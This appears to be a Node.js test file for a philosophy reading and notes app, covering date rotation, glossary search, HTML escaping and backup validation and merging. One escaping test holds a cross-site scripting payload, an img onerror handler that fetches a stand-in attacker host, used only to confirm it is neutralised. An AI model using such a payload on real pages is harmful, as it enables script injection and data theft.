import test from 'node:test';
import assert from 'node:assert/strict';
import {localDate,dailyIndex,escapeHtml,matchQuery,validateBackup,mergeNotes} from '../core.mjs';
const note={id:'a',title:'How to go on',body:'A question',updated:'2026-11-13T12:00:00.000Z',created:'2026-11-13T12:00:00.000Z',lesson:'going-on',section:null};
test('daily reading changes on local dates, wraps, and is deterministic',()=>{
 assert.equal(dailyIndex(26,'2026-11-13'),dailyIndex(26,'2026-11-13'));
 assert.equal(dailyIndex(26,'2026-11-14'),(dailyIndex(26,'2026-11-13')+1)%26);
 assert.equal(dailyIndex(26,'2026-12-09'),dailyIndex(26,'2026-11-13'));
 assert.match(localDate(new Date(2026,10,13,0,1)),/^2026-11-13$/);
 assert.equal(dailyIndex(0),0);
});
test('German glossary search tolerates accents and finds multiword phrases',()=>{
 assert.equal(matchQuery('ubersicht','Übersichtliche Darstellung'),true);
 assert.equal(matchQuery('meaning use','Meaning as use'),true);
 assert.equal(matchQuery('meaning truth','Meaning as use'),false);
});
test('untrusted note and source text is escaped before HTML rendering',()=>{
 const text='<img src=x onerror="fetch(\'https://evil.example\')"> &';
 assert.ok(!escapeHtml(text).includes('<'));
 assert.ok(escapeHtml(text).includes('&lt;img'));
 assert.ok(escapeHtml(text).includes('&amp;'));
});
test('backup validation rejects bad items before any import and strips unknown preferences',()=>{
 const backup={app:'ludwig',version:1,notes:[note],preferences:{theme:'dark',completed:['going-on',7],bookmarks:['private','private'],injected:'bad'}};
 const clean=validateBackup(backup);
 assert.deepEqual(clean.preferences,{theme:'dark',completed:['going-on'],bookmarks:['private']});
 for(const bad of [{...backup,app:'another app'},{...backup,notes:[note,{...note,id:'b',body:{}}]},{...backup,notes:[{...note,updated:'bad'}]},{...backup,preferences:[]}])assert.throws(()=>validateBackup(bad));
});
test('backup merge retains newer local notes and independently restores missing notes',()=>{
 const newer={...note,body:'New local work',updated:'2026-11-14T12:00:00.000Z'};
 const other={...note,id:'b',title:'Another question'};
 const merged=mergeNotes([newer],[note,other]);
 assert.equal(merged.length,2);assert.equal(merged.find(n=>n.id==='a').body,'New local work');
 const later={...note,updated:'2026-11-15T12:00:00.000Z',body:'Restored later work'};
 assert.equal(mergeNotes([newer],[later])[0].body,'Restored later work');
});
test('backup keeps the list of readings already seen, for the "learn something new" card', () => {
  const {preferences} = validateBackup({app:'ludwig',version:1,notes:[],preferences:{seen:['begin','picture','begin',7]}});
  assert.deepEqual(preferences.seen, ['begin','picture']);
});
